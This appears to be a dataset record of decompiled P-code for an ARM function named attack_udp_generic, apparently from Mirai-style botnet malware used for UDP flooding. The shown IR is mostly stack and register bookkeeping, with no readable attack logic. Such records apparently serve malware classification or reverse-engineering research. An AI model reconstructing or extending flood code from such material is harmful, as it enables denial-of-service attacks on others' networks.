Label: 857
Function: attack_udp_generic
Architecture: arm
Source File: Unknown
Entry Point: 00018938

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x1000021e, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x4e8, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x4e8, 4)
(unique, 0x1000026a, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffb8, 4) , (const, 0x1, 4)
(register, 0x28, 4) INT_ZEXT (register, 0x20, 1)
(ram, 0x18f54, 4) MULTIEQUAL (ram, 0x18f54, 4) , (ram, 0x18f54, 4)
(ram, 0x18f58, 4) MULTIEQUAL (ram, 0x18f58, 4) , (ram, 0x18f58, 4)
(ram, 0x18f5c, 4) MULTIEQUAL (ram, 0x18f5c, 4) , (ram, 0x18f5c, 4)
(ram, 0x18f60, 4) MULTIEQUAL (ram, 0x18f60, 4) , (ram, 0x18f60, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (stack, 0xffffffffffffffbc, 4) , (stack, 0xffffffffffffffbc, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdd, 1) MULTIEQUAL (stack, 0xffffffffffffffdd, 1) , (stack, 0xffffffffffffffdd, 1)
(stack, 0xffffffffffffffde, 2) MULTIEQUAL (stack, 0xffffffffffffffde, 2) , (stack, 0xffffffffffffffde, 2)
(stack, 0xffffffffffffffe0, 2) MULTIEQUAL (stack, 0xffffffffffffffe0, 2) , (stack, 0xffffffffffffffe0, 2)
(stack, 0xffffffffffffffe2, 1) MULTIEQUAL (stack, 0xffffffffffffffe2, 1) , (stack, 0xffffffffffffffe2, 1)
(stack, 0xffffffffffffffe3, 1) MULTIEQUAL (stack, 0xffffffffffffffe3, 1) , (stack, 0xffffffffffffffe3, 1)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(stack, 0xffffffffffffffee, 2) MULTIEQUAL (stack, 0xffffffffffffffee, 2) , (stack, 0xffffffffffffffee, 2)
(unique, 0x2480, 1) INT_SLESS (stack, 0xffffffffffffffb8, 4) , (unique, 0x1000024a, 4)
 ---  CBRANCH (ram, 0x18cb4, 1) , (unique, 0x2480, 1)
(unique, 0x1000024a, 4) CAST (register, 0x28, 4)
(ram, 0x18f54, 4) MULTIEQUAL (ram, 0x18f54, 4) , (ram, 0x18f54, 4)
(ram, 0x18f58, 4) MULTIEQUAL (ram, 0x18f58, 4) , (ram, 0x18f58, 4)
(ram, 0x18f5c, 4) MULTIEQUAL (ram, 0x18f5c, 4) , (ram, 0x18f5c, 4)
(ram, 0x18f60, 4) MULTIEQUAL (ram, 0x18f60, 4) , (ram, 0x18f60, 4)
 ---  RETURN (const, 0x0, 4)
(ram, 0x18f54, 4) COPY (ram, 0x18f54, 4)
(ram, 0x18f58, 4) COPY (ram, 0x18f58, 4)
(ram, 0x18f5c, 4) COPY (ram, 0x18f5c, 4)
(ram, 0x18f60, 4) COPY (ram, 0x18f60, 4)
